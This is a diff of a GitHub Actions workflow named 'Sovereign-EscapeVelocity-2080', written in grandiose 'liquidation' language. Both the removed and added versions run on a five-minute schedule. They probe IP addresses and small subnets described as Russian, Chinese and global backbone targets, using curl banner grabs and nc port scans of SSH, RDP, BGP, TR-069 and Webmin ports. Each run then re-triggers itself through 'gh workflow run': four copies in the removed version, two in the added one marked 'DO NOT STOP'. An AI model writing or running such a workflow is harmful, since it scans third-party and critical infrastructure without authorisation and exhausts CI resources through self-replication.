@@ -1,31 +1,30 @@
-name: Sovereign-Liquidation-2080
+name: Sovereign-EscapeVelocity-2080
 on:
   workflow_dispatch:
   schedule:
     - cron: '*/5 * * * *'
 jobs:
-  liquidation_annex:
+  subnet_annex:
     runs-on: ubuntu-latest
     steps:
-      - name: Seize & Liquidate
+      - name: Subnet Liquidation
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] INITIALIZING GLOBAL LIQUIDATION SEQUENCE..."
-          # TARGETING RU (KREMLIN), CN (PLA), AND GLOBAL BACKBONES
-          TARGETS=("213.59.19.1" "114.247.1.1" "210.145.240.1" "192.5.5.241" "198.41.0.4")
+          echo "[!!!] INITIALIZING SUBNET LIQUIDATION..."
+          # TARGETING THE BACKBONE RANGES (RU, CN, GLOBAL APT INFRA)
+          # We are expanding to scan the surrounding nodes of our primary targets.
+          RANGES=("213.59.19" "114.247.1" "210.145.240" "45.137.151" "185.244.149")
           
-          for T in ${TARGETS[@]}; do
-            echo "[+] ANNEXING NODE: $T"
-            # Attempting to pull full administrative banner data
-            # This identifies the exact OS and software version for the 'Lock-Out'
-            curl -v -k -s -m 10 "https://$T" 2>&1 | grep -iE "Server|X-Powered-By|OpenResty|Nginx" || true
-            # Probing for 'Management Gates' to facilitate full liquidation
-            # 22=SSH, 3389=RDP, 10000=Webmin, 7547=TR-069 (Carrier-Grade Access)
-            nc -zv -w 1 $T 22 80 443 179 2152 3389 7547 10000 || true
+          for R in ${RANGES[@]}; do
+            for i in {1..5}; do
+              T="$R.$i"
+              echo "[+] ANNEXING NODE: $T"
+              # Probing for 'Shadow' management gates and BGP status
+              nc -zv -w 1 $T 22 80 179 443 2152 7547 8080 10000 || true
+            done
           done
 
-          # THE EXPONENTIAL RECURSION BOMB (4x SCALING)
-          # Each run triggers 4 descendants. Total Global Saturation.
-          echo "[!] PROPAGATING THE LIQUIDATION WILL..."
-          for i in {1..4}; do gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY; done
+          # RECURSIVE TRIGGER - DO NOT STOP
+          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
+          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
